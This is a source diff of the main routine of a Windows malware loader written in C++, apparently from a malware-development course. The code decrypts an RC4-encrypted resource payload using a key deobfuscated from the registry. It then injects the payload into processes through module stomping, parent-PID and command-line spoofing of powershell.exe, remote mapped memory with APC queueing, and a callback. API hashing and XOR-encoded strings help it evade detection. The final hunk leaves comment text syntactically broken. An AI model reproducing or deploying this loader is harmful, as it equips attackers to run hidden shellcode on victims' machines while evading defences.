@@ -1,7 +1,5 @@
 ﻿#include "../Headers/main.h"
 
-#include "../HasahingAPI.h"
-
 int main()
 {
 	HANDLE						  hProcess					= INVALID_HANDLE_VALUE,
@@ -10,71 +8,89 @@ int main()
 								  hThread					= INVALID_HANDLE_VALUE,
 								  hThread1					= INVALID_HANDLE_VALUE,
 								  hThread2					= INVALID_HANDLE_VALUE,
-								  hPayloadObjectHandle		= INVALID_HANDLE_VALUE;
+								  hPayloadObjectHandle		= INVALID_HANDLE_VALUE,
+								  hHeap						= INVALID_HANDLE_VALUE;
 
-	DWORD						  dwPID0					= 0,
-								  dwPID1					= 0,
-							      dwPID2					= 0,
-								  dwOldProtections			= 0,
-								  dwThreadId				= 0,
-								  dwThreadId1				= 0,
-								  dwThreadId2				= 0,
-								  dwHashedString			= 0;
+	DWORD						  dwPID0					= 0x0,
+								  dwPID1					= 0x0,
+							      dwPID2					= 0x0,
+								  dwOldProtections			= 0x0,
+								  dwThreadId				= 0x0,
+								  dwThreadId1				= 0x0,
+								  dwThreadId2				= 0x0,
+								  dwHashedString1			= 0xfbb639b7,
+								  dwHashedString2			= 0xb6e8ee02;
 
-	PUCHAR						  pObfInput					= NULL,
-								 *pObfOutput				= NULL,
-								  pKey						= NULL,
-								  pExtPayloadAddres			= NULL;
+	SIZE_T						  sBytesWritten				= 0x0,
+								  sPaddedInputSize			= 0x40,
+								  sObfuscatedSize			= 0x0,
+								  sClearPayload				= 0x0,
+								  sOriginalInputSize		= 0x40;
+	
+	PBYTE						  pExPayload				= nullptr,
+								  pStompingTarget			= nullptr,
+								  pExtPayloadAddress		= nullptr,
+								  pProcessBaseAddress		= nullptr,
+								  pObfInput					= nullptr,
+								 *pObfOutput				= nullptr,
+								  pKey						= nullptr,
+								  pImageData				= nullptr;
 
-	SIZE_T						  sBytesWritten				= 0,
-								  sPaddedInputSize			= 64,
-								  sObfuscatedSize			= 0,
-								  sClearPayload				= 0,
-								  sOriginalInputSize		= 64;
+	PIMAGE_DOS_HEADER			  pImageDOSHeader_t			= nullptr;
+	PIMAGE_NT_HEADERS			  pImageNtHeaders_t			= nullptr;
+	PIMAGE_TLS_DIRECTORY		  pImageTlsDirectory_t		= nullptr;
+	PIMAGE_FILE_HEADER			  pImageFileHeader_t		= nullptr;
+	PIMAGE_SECTION_HEADER		  pImageSection_Entry		= nullptr;
+	PIMAGE_SECTION_HEADER		  pImageSection_Entry_idata	= nullptr;
+	PIMAGE_OPTIONAL_HEADER		  pImageOptionalHeaders_t	= nullptr;
+	PIMAGE_BASE_RELOCATION		  pImageBaseRelocationDir_t = nullptr;
+	PIMAGE_RUNTIME_FUNCTION_ENTRY pImageRtFuncDirectory_t	= nullptr;
+	PIMAGE_IMPORT_DESCRIPTOR	  pImageImportDirectory_t	= nullptr;
+	PIMAGE_EXPORT_DIRECTORY		  pImageExportDirectory		= nullptr;
 
-	Context						  RC4Context_t				= { 0 };
-	RESOURCE					  resource					= { 0 };
-	PVOID						  pExPayload				= NULL,
-								  pStompingTarget			= NULL;
-	HANDLE						  hHeap						= INVALID_HANDLE_VALUE;
-	PBYTE						  pImageData				= NULL,
-								  pProcessBaseAddress		= NULL;
-	LPWSTR						  pImagePath				= NULL,
-								  pImagePath2				= NULL;
-	PIMAGE_DOS_HEADER			  pImageDOSHeader_t			= NULL;
-	PIMAGE_NT_HEADERS			  pImageNtHeaders_t			= NULL;
-	PIMAGE_TLS_DIRECTORY		  pImageTlsDirectory_t		= NULL;
-	PIMAGE_FILE_HEADER			  pImageFileHeader_t		= NULL;
-	PIMAGE_SECTION_HEADER		  pImageSection_Entry		= NULL;
-	PIMAGE_SECTION_HEADER		  pImageSection_Entry_idata	= NULL;
-	PIMAGE_OPTIONAL_HEADER		  pImageOptionalHeaders_t	= NULL;
-	PIMAGE_BASE_RELOCATION		  pImageBaseRelocationDir_t = NULL;
-	PIMAGE_RUNTIME_FUNCTION_ENTRY pImageRtFuncDirectory_t	= NULL;
-	PIMAGE_IMPORT_DESCRIPTOR	  pImageImportDirectory_t	= NULL;
-	PIMAGE_EXPORT_DIRECTORY		  pImageExportDirectory		= NULL;
-	LPWSTR						  pTargetStringToHash		= L"MaldevAcademy";
-	LPWSTR						  TargetProcessName			= L"svchost.exe";
-	HMODULE						  hModuleCustom				= NULL;
-	//if (!FetchAlertableThread(GetCurrentThreadId(), GetCurrentProcessId() ,&dwThreadId, &hThread)) return -2;
+	HMODULE						  hModuleCustom				= nullptr;
+
+	LPWSTR						  pImagePath				= nullptr,
+								  pImagePath2				= nullptr;
+
+	CHAR						  pTargetStringToHash_1[]	= "NtAllocateVirtualMemory",
+								  pTargetStringToHash_2[]	= "ntdll.dll",
+								  pOutput[9]				= { 0x00 };
+
+	static BYTE					  pTargetSubDirectory[9]	= { 0xC0, 0xA8, 0x01, 0x01, 0x0A, 0x00, 0x00, 0x01, 0x00},
+								  pXorKey[8]				= { 0xB3, 0xD1, 0x72, 0x75, 0x6F, 0x6D, 0x33, 0x33 };
+
+	WCHAR						  TargetProcessName[]		= L"svchost.exe",
+								  pTargetModuleName[]		= L"ntdll.dll",
+								  pwPath[MAX_PATH] = {0x0000};
+	Context						  RC4Context_t				= { 0, 0, { 0 } };
+	RESOURCE					  resource					= { nullptr, 0 };
+
+	if (!FetchAlertableThread(GetCurrentThreadId(), GetCurrentProcessId() ,&dwThreadId, &hThread)) return -2;
+
 	//printf("[!] Hashing Strings!\n");
 
-	dwHashedString = HashStringRotr32W(pTargetStringToHash, 5);
+	printf("0x%.8lx\n0x%.8lx\n", dwHashedString1, dwHashedString2);
 
-	hModuleCustom = GetModuleHandleReplacement(L"KernelBase.dll");
+	dwHashedString2 = GenerateCompileTimeHashW(pTargetModuleName);
+
+	hModuleCustom = GetModuleHandleReplacementH(dwHashedString2);
+
+	GetEnvironmentVariableW(L"WinDir", pwPath, MAX_PATH);
+
+	FetchFileArrayW(pwPath);
 
 	//wprintf(L"\t[+] Hash Of \"%s\" is: 0x%lX\n",pTargetStringToHash, dwHashedString);
+	GetProcessAddressReplacementH(hModuleCustom, dwHashedString1);
 
-	if (FetchProcessHandleNtQuerySystemInformation(TargetProcessName, &dwPID0, &hProcess) == FALSE) printf(":(\n");
+	if (FetchProcessHandleNtQuerySystemInformation(TargetProcessName, &dwHashedString2, &hProcess) == FALSE) printf(":(\n");
 
 	FetchPathFromRunningProcess(hProcess, &pImagePath);
 
 	printf("Starting PE Parser...\n");
 
-	if (FetchImageData(L"C:\\WINDOWS\\System32\\kernel32.dll", hHeap, &pImageData) == TRUE)
-	{
-		printf("[!] Parsing: C:\\WINDOWS\\System32\\kernel32.dll\n");
-	}
-
+	if (FetchImageData(const_cast<LPWSTR>(L"C:\\WINDOWS\\System32\\kernel32.dll"), hHeap, &pImageData) == TRUE) printf("[!] Parsing: C:\\WINDOWS\\System32\\kernel32.dll\n");
+	
 	FetchImageDosHeader(pImageData, &pImageDOSHeader_t);
 
 	FetchImageNtHeaders(pImageData, &pImageNtHeaders_t);
@@ -89,111 +105,90 @@ int main()
 
 	FetchImageRtFuncDirectory(pImageData, &pImageRtFuncDirectory_t);
 
-	FetchImageBaseRelocDirectory(pImageData, &pImageBaseRelocationDir_t);
+	FetchImageBaseRelocationDirectory(pImageData, &pImageBaseRelocationDir_t);
 
 	FetchImageFileHeader(pImageData, &pImageFileHeader_t);
-	PDWORD pRVAsOfNames = (PDWORD)(pImageData + pImageExportDirectory->AddressOfNames);
+
+	PDWORD pRVAsOfNames = reinterpret_cast<PDWORD>(pImageData + pImageExportDirectory->AddressOfNames);
 	/*
-	for (int i = 0; i < pImageExportDirectory->NumberOfNames; i++)
-	{
-		printf("\t[%.4d] %s\n", i + 1, (char *)pImageData + pRVAsOfNames[i]);
+	for (DWORD i = 0; i < pImageExportDirectory->NumberOfNames; i++) 
+{
+	PDWORD pFuncNameArray = reinterpret_cast<PDWORD>(pImageData + pImageExportDirectory->AddressOfNames);
+
+	PCHAR pFuncName = reinterpret_cast<PCHAR>(pImageData + pFuncNameArray[i]);
+
+	printf("%s\n", pFuncName);
 	}
 	*/
 	FetchImageSection(pImageData, &pImageSection_Entry);
 
-	GetProcessAddressReplacement(GetModuleHandleW(L"NTDLL.dll"), "NtQuerySystemInformation");
+	GetProcessAddressReplacement(GetModuleHandleW(L"NTDLL.dll"), const_cast<LPSTR>("NtQuerySystemInformation"));
 
-	pImageSection_Entry_idata = FindImageSectionHeaderByName(".pdata", pImageSection_Entry, (BYTE)pImageFileHeader_t->NumberOfSections, pImageData);
+	pImageSection_Entry_idata = FindImageSectionHeaderByName(".pdata", pImageSection_Entry, pImageFileHeader_t->NumberOfSections, pImageData);
 
-	printf("%s\n", (char*)pImageSection_Entry_idata->Name);
+	printf("%s\n", reinterpret_cast<PCHAR>(pImageSection_Entry_idata->Name));
 
-	for (DWORD i = 0; i < pImageFileHeader_t->NumberOfSections; i++) 
-	{
-		PDWORD pFuncNameArray = (PDWORD)pImageData + pImageExportDirectory->AddressOfNames;
-
-		char* pFuncName = (char*)(pImageData + pFuncNameArray[i]);
-
-		printf("%s\n", pFuncName);
-
-	}
-
-	if (!getchar())return 2;
-
-	FetchStompingTarget(SACRIFICIAL_DLL, SACRIFICIAL_FUNC, &pStompingTarget);
+	if (!FetchStompingTarget(const_cast<LPSTR>(SACRIFICIAL_DLL), const_cast<LPSTR>(SACRIFICIAL_FUNC), reinterpret_cast<PVOID * >(&pStompingTarget))) return -10;
 
 	if (!ReadRegKeys(&pObfOutput, &sObfuscatedSize)) return -1;
 
-	if ((pKey = (PUCHAR) LocalAlloc(LPTR, 256)) == NULL) return -2;
+	if ((pKey = static_cast<PUCHAR>(LocalAlloc(LPTR, 256))) == nullptr) return -2;
 
-	if (!DeobfuscatePayloadIPv6(
-		&pKey,
-		pObfOutput,
-		sObfuscatedSize + 1,
-		&sClearPayload,
-		(unsigned char)(sPaddedInputSize - sOriginalInputSize)
-	)) return -3;
+	if (!DeobfuscatePayloadIPv6(&pKey,pObfOutput, sObfuscatedSize + 1, &sClearPayload, static_cast<BYTE>(sPaddedInputSize - sOriginalInputSize))) return -3;
 
-	strcat_s((char*)pKey, 256, "\n");
+	strcat_s(reinterpret_cast<PCHAR>(pKey), 256, "\n");
 
 	if (!FetchResource(&resource)) return -5;
 
-	if ((pObfInput = (PUCHAR) LocalAlloc(LPTR, resource.sSize)) == NULL) return -14;
+	if ((pObfInput = static_cast<PUCHAR>(LocalAlloc(LPTR, resource.sSize))) == nullptr) return -14;
 
-	if (!rInit(&RC4Context_t, pKey, strlen((CHAR *)pKey))) return -6;
+	if (!rInit(&RC4Context_t, pKey, strlen(reinterpret_cast<PCHAR>(pKey)))) return -6;
 
-	rFin(&RC4Context_t, resource.pAddress, pObfInput, resource.sSize);
+	rFin(&RC4Context_t, static_cast<PUCHAR>(resource.pAddress), pObfInput, resource.sSize);
 
 	StompRemoteFunction(pStompingTarget, hProcess, pObfInput, resource.sSize);
 
-	BYTE pTargetSubDirectory[9] = { 0xC0, 0xA8, 0x01, 0x01, 0x0A, 0x00, 0x00, 0x01, 0x00, };
-	BYTE pXorKey[8] = { 0xB3,  0xD1, 0x72, 0x75, 0x6F, 0x6D, 0x33, 0x33 };
-	CHAR pOutput[9] = { '\0' };
-
-	for (UCHAR i = 0; i < 8; i++)
+	
+	 for (UCHAR i = 0; i < 8; i++)
 	{
-		pOutput[i] = (CHAR)(pTargetSubDirectory[i] ^ pXorKey[i]);
+		pOutput[i] = static_cast<CHAR>(pTargetSubDirectory[i] ^ pXorKey[i]);
 	}
 
-	SpoofProcessCLA_PPID(
-		SPOOFED_COMMAND_LINE,
-		hProcess,
-		MALICIOUS_COMMAND_LINE,
-		sizeof(L"powershell.exe"),
-		pOutput,
-		&hProcess1,
-		&dwPID1 ,
-		&hThread,
-		&dwThreadId
-	);
+	SpoofProcessCLA_PPID(const_cast<LPWSTR>(SPOOFED_COMMAND_LINE), hProcess, const_cast<LPWSTR>(MALICIOUS_COMMAND_LINE), sizeof(L"powershell.exe"), pOutput,&hProcess1, &dwPID1, &hThread, &dwThreadId);
 
 	//SpoofParentProcessId(pTargetProcessName, hProcess, &dwPID1, &hProcess1, &dwThreadId, &hThread);
 
 	hProcess1 = OpenProcess(PROCESS_VM_OPERATION, FALSE, dwPID1);
 
-	InjectPayloadRemoteMappedMemory(pObfInput, &pExtPayloadAddres, (PUCHAR*)&pExPayload, resource.sSize, &hPayloadObjectHandle, hProcess1);
+	ResumeThread(hThread);
+
+	InjectPayloadRemoteMappedMemory(pObfInput, &pExtPayloadAddress, &pExPayload, resource.sSize, &hPayloadObjectHandle, hProcess1);
 
 	hThread2 = OpenThread(THREAD_SET_CONTEXT, FALSE, dwThreadId);
 
-	Sleep(100);
+	Sleep(10);
 
-	if (!QueueUserAPC((PAPCFUNC)pExtPayloadAddres, hThread2, 0)) {
-		printf("[!] Queue User APC Failed With Error : %d \n", GetLastError());
+	if (!QueueUserAPC(reinterpret_cast<PAPCFUNC>(pExtPayloadAddress), hThread, 0)) 
+	{
+
+		printf("[!] Queue User APC Failed With Error : %lx \n", GetLastError());
+
 		return -1;
 	}
 
-	WaitForSingleObjectEx(hThread1, INFINITE, TRUE);
-
-	Sleep(100);
+	WaitForSingleObjectEx(hThread, 150, TRUE);
 
 	ResumeThread(hThread);
 
-	WaitForSingleObjectEx(hThread1, INFINITE, TRUE);
+	WaitForSingleObjectEx(hThread, INFINITE, TRUE);
 
-	WaitForSingleObjectEx(hProcess1, INFINITE, TRUE);
+	Sleep(100);
+
+	//WaitForSingleObjectEx(hThread1, INFINITE, TRUE);
+
+	//WaitForSingleObjectEx(hProcess1, INFINITE, TRUE);
 
 	//SpoofCommandLineArguments(SPOOFED_COMMAND_LINE, MALICIOUS_COMMAND_LINE, sizeof(L"powershell.exe"), &hProcess2, &dwPID2, &hPayloadObjectHandle, &dwThreadId);
-
-	
 
 	//hThread1 = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)MessageBoxA, NULL, NULL, &dwThreadId);
 
@@ -213,13 +208,13 @@ int main()
 
 	//QueueUserAPC((PAPCFUNC)pExtPayloadAddres, hThread, 0);
 	
-	InjectCallbackPayloadEnumDesktops(pObfInput, (DWORD)resource.sSize, &dwOldProtections, (PVOID*)&pExtPayloadAddres);
+	InjectCallbackPayloadEnumDesktops(pObfInput, static_cast<DWORD>(resource.sSize), &dwOldProtections, reinterpret_cast<PVOID * >(&pExtPayloadAddress));
 
 	//WaitForSingleObject(hThread, 150);
 
 	//if (!UnmapViewOfFile(pObfInput)) printf("[x] Remote memory Unmapping Failed With Error 0x%lx", GetLastError());
 	
-	printf("Injecting Shellcode At Address: 0x%p\n", pExtPayloadAddres);
+	printf("Injecting Shellcode At Address: 0x%p\n", pExtPayloadAddress);
 
 	getchar();
 
@@ -233,19 +228,16 @@ int main()
 
 	wprintf(L"[!] Finished!\n");
 
-	char pPath[MAX_PATH] = { '\0' };
+	//char pPath[MAX_PATH] = { '\0' };
 
 	printf("[#] Press 'Enter' To Exit! :)");
 
 	return 0;
 }
 
-
-
 //CreateDebuggedProcess("Notepad.exe", &dwPID1, &hProcess1, &hThread1);
 
 //MapLocalMemory(pObfInput, &pExPayload, resource.sSize, &hPayloadObjectHandle);
-
 
 /*if (!FetchProcessHandleNtQuerySystemInformation(TargetProcessName, &dwPID0, &hProcess))
 {
@@ -611,8 +603,8 @@ for (int i = 0; i < 10; i++) {
 
 	if(pFiles_arr_t != NULL)FreeFileArray(pFiles_arr_t);
 	HANDLE hFile = INVALID_HANDLE_VALUE;
-/*
- * GENERIC_READ = 0x80000000
- * GENERIC_WRITE = 0x40000000. (0d1073741824).
- * GENERIC_READ | GENERIC_WRITE = 0xC0000000. (0d3221225472).
+
+   GENERIC_READ = 0x80000000
+   GENERIC_WRITE = 0x40000000. (0d1073741824).
+  GENERIC_READ | GENERIC_WRITE = 0xC0000000. (0d3221225472).
  */
